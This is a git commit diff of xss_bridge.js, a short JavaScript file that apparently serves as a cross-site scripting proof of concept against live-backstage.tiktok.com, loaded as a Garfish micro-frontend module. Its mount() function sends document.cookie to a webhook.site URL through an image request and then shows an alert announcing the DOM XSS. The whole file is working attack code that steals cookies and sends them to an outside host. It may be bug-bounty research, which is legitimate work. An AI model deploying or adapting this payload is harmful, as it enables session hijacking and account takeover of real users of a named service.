6d5a574feccae482752d4bc975bca926761fad4e
Juan Oviedo <65684836+juanoviedo28@users.noreply.github.com>
2025-06-30 17:35:35 -0300

    Update xss_bridge.js

--- xss_bridge.js
+++ xss_bridge.js
@@ -1,4 +1,15 @@
-new Image().src = "https://webhook.site/e286a29a-cca2-4759-9da3-92f07bcf6e19?" + document.cookie;
-alert("DOM XSS ejecutado en live-backstage.tiktok.com");
+console.log("✅ Ejecutando xss_bridge.js desde GitHub Pages");
+
+// Este es el punto de entrada que Garfish usa
+export function bootstrap() {}
+
+export function mount() {
+  // Exfiltración + PoC visual
+  new Image().src = "https://webhook.site/e286a29a-cca2-4759-9da3-92f07bcf6e19?" + document.cookie;
+  alert("DOM XSS ejecutado en live-backstage.tiktok.com");
+}
+
+export function unmount() {}
+
 
 
